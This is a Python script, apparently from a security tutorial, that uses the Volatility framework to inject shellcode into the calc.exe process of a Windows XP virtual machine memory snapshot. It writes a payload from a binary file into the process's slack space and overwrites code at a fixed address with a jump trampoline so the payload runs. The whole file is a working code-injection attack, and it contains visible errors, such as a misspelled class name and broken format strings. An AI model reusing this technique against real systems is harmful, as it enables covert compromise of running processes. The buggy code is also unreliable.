import sys
import struct

equals_button = 0x01005D51

memory_file = "WinXPSP2.vmem"
slack_space = None
trampoline_offset = None

# read in our shellcode
sc_fd = open("cmeasure.bin", "rb")
sc = sc_fd.read()
sc_fd.close()

sys.path.append("/Users/justin/Downloads/volatility-2.1")

import volatility.conf as conf
import volatility.registry as registry

registry.PluginImporter()
config = conf.ConfObject()

import volatility.commands as commands
import volatility.addrspace as addrspace

registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrspace.BaseAddressSapce)

config.parse_options()
config.PROFILE = "WinXPSP2x86"
config.LOCATION = "file://%s" % memory_file

import volatility.plugin.taskmods as taskmods

p = taskmods.PSList(config)
for process in p.calculate():
    if str(process.ImageFileName) == "calc.exe":
        print("[*] Found calc.exe with PID {0}".format(process.UniqueProcessId))
        print("[*] Hunting for physical offsets...please wait.")
        address_space = process.get_process_address_space()
        pages = address_space.get_available_pages()
        for page in pages:
            physical = address_space.vtop(page[0])
            if physical is not None:
                if slack_space is None:
                    fd = open(memory_file, "r+")
                    fd.seek(physical)
                    buf = fd.read(page[1])
                    try:
                        offset = buf.index("\x00" * len(sc))
                        slack_space = page[0] + offset

                        print("[*] Found good shellcode location!")
                        print("[*] Virtual address: 0x{0}08x".format(slack_space))
                        print("[*] Physical address: 0x{0}08x".format(physical + offset))
                        print("[*] Injecting shellcode.")
                        fd.seek(physical + offset)
                        fd.write(sc)
                        fd.flush()
                        # create the trampoline
                        tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
                        tramp += "\xff\xe3"
                        if trampoline_offset is not None:
                            break
                    except:
                        pass
                    fd.close()
                # check for our target code location
                if page[0] <= equals_button and equals_button < ((page[0] + page[1]) - 7):
                    print("[*] Found our trampoline target at: 0x{0}08x".format(physical))
                    # calculate virtual offset
                    v_offset = equals_button - page[0]
                    # now calculate physical offset
                    trampoline_offset = physical + v_offset
                    print("[*] Found our trampoline target at: 0x{0}08x".format(trampoline_offset))
                    if slack_space is not None:
                        break
        print("[*] Writing  trampoline...")
        fd = open(memory_file, "r+")
        fd.seek(trampoline_offset)
        fd.write(tramp)
        fd.close()
        print("[*] Done injecting code.")